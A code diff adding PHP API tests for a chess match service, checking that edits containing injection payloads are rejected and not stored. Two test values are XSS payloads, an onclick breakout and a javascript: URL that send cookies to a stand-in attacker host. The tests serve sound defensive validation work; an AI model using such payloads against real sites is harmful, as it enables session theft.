@@ -107,6 +107,52 @@ class ChessMatchMutationTest extends ApiTestCase
         self::assertSame($analysisId, $match['analysis_url']);
     }
 
+    public function testEditRejectsInvalidResultAndDoesNotPersistIt(): void
+    {
+        $this->loginAsAdmin();
+        $this->jsonRequest('POST', '/api/matches', ['white' => 'Alice', 'black' => 'Bob', 'result' => '1']);
+
+        // The exact payload that would otherwise land unescaped inside an
+        // onclick="..." attribute for every admin viewing the match list.
+        $this->jsonRequest('PATCH', '/api/matches/1', [
+            'result' => "x'); fetch('https://attacker.example/x'); //",
+        ]);
+        self::assertSame(400, $this->client->getResponse()->getStatusCode());
+        self::assertFalse($this->jsonBody()['success']);
+
+        $this->client->request('GET', '/api/matches');
+        $match = current(array_filter($this->jsonBody()['matches'], static fn ($m) => $m['id'] === 1));
+        self::assertSame('1-0', $match['result'], 'Rejected edit must leave the original result untouched');
+    }
+
+    public function testEditRejectsNonHttpAnalysisUrlAndDoesNotPersistIt(): void
+    {
+        $this->loginAsAdmin();
+        $this->jsonRequest('POST', '/api/matches', ['white' => 'Alice', 'black' => 'Bob', 'result' => '1']);
+
+        $this->jsonRequest('PATCH', '/api/matches/1', [
+            'analysis_url' => "javascript:fetch('https://attacker.example/x?c='+document.cookie)",
+        ]);
+        self::assertSame(400, $this->client->getResponse()->getStatusCode());
+        self::assertFalse($this->jsonBody()['success']);
+
+        $this->client->request('GET', '/api/matches');
+        $match = current(array_filter($this->jsonBody()['matches'], static fn ($m) => $m['id'] === 1));
+        self::assertSame('', $match['analysis_url'] ?? '', 'Rejected edit must leave analysis_url untouched');
+    }
+
+    public function testEditAcceptsLegitimateAnalysisUrlShapes(): void
+    {
+        $this->loginAsAdmin();
+        $this->jsonRequest('POST', '/api/matches', ['white' => 'Alice', 'black' => 'Bob', 'result' => '1']);
+
+        $this->jsonRequest('PATCH', '/api/matches/1', ['analysis_url' => 'https://chessigma.com/analysis/abc']);
+        self::assertResponseIsSuccessful();
+
+        $this->jsonRequest('PATCH', '/api/matches/1', ['analysis_url' => str_repeat('a1', 8)]); // internal-id shape
+        self::assertResponseIsSuccessful();
+    }
+
     public function testMutationsRequireApiAccess(): void
     {
         $this->jsonRequest('POST', '/api/matches', ['white' => 'A', 'black' => 'B', 'result' => '1']);
